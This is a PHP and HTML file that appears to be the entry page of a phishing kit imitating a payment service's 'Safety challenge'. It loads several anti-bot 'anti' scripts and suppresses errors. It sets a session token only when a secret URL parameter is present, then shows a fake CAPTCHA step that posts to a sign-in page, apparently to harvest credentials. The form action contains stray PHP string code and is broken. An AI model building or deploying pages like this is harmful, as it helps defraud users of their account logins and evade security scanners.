<?php
session_start();
include "config/conf.php";
include "anti/anti1.php";
include "anti/anti2.php";
include "anti/anti3.php";
include "anti/anti4.php";
include "anti/anti5.php";
include "anti/anti6.php";
include "anti/anti7.php";
error_reporting(0);

if(isset($_GET["pp"]) && $_GET["pp"] == "2300"){
session_start();
$_SESSION["good"] = "okito";
header("location:wait");
}
?>
 <!DOCTYPE html>
<html>
<head>
	<meta http-equiv="X-UA-Compatible" content="IE=Edge" />
	<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes" />
	<link rel="shortcut icon" href="logo.ico" />
	<link rel="stylesheet" href="xppx.css" />
	<title></title>
</head>
<body>
	<div class="contentContainer" id="content">
		<div class="safeComponent" data-nemo="safeStartPage"> 
			<header><div class="xysx-logo"></div> </header>
                  <img src="2x.png" style=" width: 50px;">
			<h1>Safety challenge</h1>
			<br>
</div>   <form action="signin.php?enc='.md5(time()).'&p=0&dispatch='.sha1(time()));" method="post">
   							<div style="transform: scale(0.9);">
<div class="g-recaptcha" data-sitekey="6LdwPBUqAAAAAOFMkzgXRilWWF-jI5CLnZRUGLSt"></div>
						</div>

	<button type="submit" id="xyssubmitsecx" name="safeContinueButton" class="button safeContinueButton primary" value="">I'm not a robot</button>
	   </form> 

	<!-- The function is executed when the user presses this button -->
</body>
<script src='https://www.google.com/recaptcha/api.js'></script>
</body>
</html>
